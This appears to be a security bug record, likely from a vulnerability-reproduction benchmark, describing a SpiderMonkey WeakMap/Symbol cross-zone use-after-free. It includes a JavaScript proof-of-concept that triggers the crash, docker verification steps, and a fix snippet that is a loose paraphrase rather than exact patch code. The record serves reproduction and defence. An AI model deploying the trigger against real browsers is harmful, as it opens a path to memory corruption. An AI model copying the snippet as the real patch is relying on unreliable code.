# Bugzilla 1885775

**Title:** WeakMap+Symbol cross-zone use-after-free (sweep-group edge missing)
**Severity:** sec-high (csectype-uaf)
**Component:** SpiderMonkey — GC — `js/src/gc/WeakMap-inl.h`
**Fix commit:** `26125066c9f657eae22718920085779bb586b72b` ("Bug 1885775 - addSweepGroupEdgeTo Weakmap's zone if the key is of a JS::Symbol", Yoshi Cheng-Hao Huang, 2024-03-26, r=jonco)
**Vulnerable revision:** `26125066c9f657eae22718920085779bb586b72b~1`
**Reporter:** Christian Holler (:decoder)

## Summary

When a `JS::Symbol` is used as a key in a cross-zone `WeakMap`,
`WeakMap::addImplicitEdges` did **not** add a sweep-group edge from
the symbol's zone to the WeakMap's zone. The two zones could then be
placed in different sweep groups, so the GC could collect the symbol
while the corresponding WeakMap entry was still considered live. The
dangling entry caused a UAF in `GCMarker::processMarkStackTop` while
re-marking the (now freed) symbol cell.

## Fix

```cpp
// js/src/gc/WeakMap-inl.h
// Same handling that already existed for JSObject keys is now applied
// to JS::Symbol keys: insert a sweep-group edge from the key's zone
// (sym->zone()) to the map's zone so they land in the same group.
if (key.isObject() || key.isSymbol()) {
  if (!sym->zone()->addSweepGroupEdgeTo(map->zone())) return false;
}
```

## Trigger (`poc.js`)

```js
// |jit-test| --enable-symbols-as-weakmap-keys
var code = `
  var m58 = new WeakMap;
  var sym = Symbol();
  m58.set(sym, ({ entry16: 0, length: 1 }));
  gcslice(50000);
`;
for (x = 0; x < 10000; ++x) evaluate(code);
```

`evaluate(code)` runs each instance in a fresh Realm; combined with
`gcslice` this drives many sweep groups across zones, exposing the
missing sweep-group edge.

## Expected crash

ASAN heap-use-after-free on `JS::Symbol` cell inside
`GCMarker::processMarkStackTop` / `traceWeakMapEntries`, surfacing as
ASAN abort during incremental GC.

## Verification

```sh
docker build -t hwiwonlee/sm.x86_64:1885775 spidermonkey/1885775
bash spidermonkey/crash_check.sh 1885775
```

Expected: `CONFIMRED: ASAN_CRASH`.
